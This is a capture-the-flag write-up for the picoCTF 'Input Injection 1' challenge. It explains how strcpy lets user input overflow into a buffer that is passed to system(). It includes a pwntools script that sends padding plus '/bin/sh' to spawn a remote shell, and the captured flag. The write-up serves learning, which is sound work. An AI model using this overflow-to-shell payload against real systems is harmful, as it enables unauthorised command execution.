# Input Injection 1 #
 
## Overview ##

Category: [Binary Exploitation](../../)

Topics: Binary Exploitation, picoMini by CMU-Africa, Buffer Overflow

## Description ##
A friendly program wants to greet you... but its goodbye might say more than it should. Can you convince it to reveal the flag?

## Approach ##
I am provided with a binary file called `vuln` and a C file called `vuln.c`. Inspecting the c file, I can see that `main` asks for my name and then stores it in a `name` variable with size 200 bytes. It uses `fgets` to read the input and has proper bounds set to prevent overflow.

    printf("What is your name?\n");
    fflush(stdout);


    fgets(name, sizeof(name), stdin);
    name[strcspn(name, "\n")] = 0;

It then calls `fun` with `name` and `"uname"` as arguments. In the `fun` function, it stores the string "uname" in a buffer called `c` with size 10 bytes. It then copies the contents of `name` into `buffer` with size 10 bytes. After a few lines, it calls `system` with `c` as argument. 

    char c[10];
    char buffer[10];

    strcpy(c, cmd);
    strcpy(buffer, name);

    printf("Goodbye, %s!\n", buffer);
    fflush(stdout);
    system(c);

Although `fgets` correctly bounds the input in `main`, the program later copies this data into smaller buffers using `strcpy`, reintroducing a buffer overflow vulnerability. Since `c` is passed directly to `system`, overwriting it with `/bin/sh` causes the program to spawn a shell. So writing a simple payload script: 

    from pwn import *

    # Port will vary
    HOST = 'amiable-citadel.picoctf.net'
    PORT = 63825

    p = remote(HOST, PORT)
    #p = process('./vuln')

    # The first 10 bytes fill buffer, and the following bytes overwrite c.
    payload = b'a'*10 + b'/bin/sh'

    p.sendline(payload)

    p.interactive()

and then running the script, I got the flag:

    What is your name?
    Goodbye, aaaaaaaaaa/bin/sh!
    $ ls
    flag.txt
    $ cat flag.txt
    picoCTF{0v3rfl0w_c0mm4nd_3185bc8f}

Flag: picoCTF{0v3rfl0w_c0mm4nd_3185bc8f}

## Reflection ## 
This was a simple buffer overflow challenge that highlighted how unsafe functions like `strcpy` can reintroduce vulnerabilities into a program. Although `fgets` properly bounds the input in `main`, copying that data into smaller buffers allowed a stack overflow that led to arbitrary command execution. 



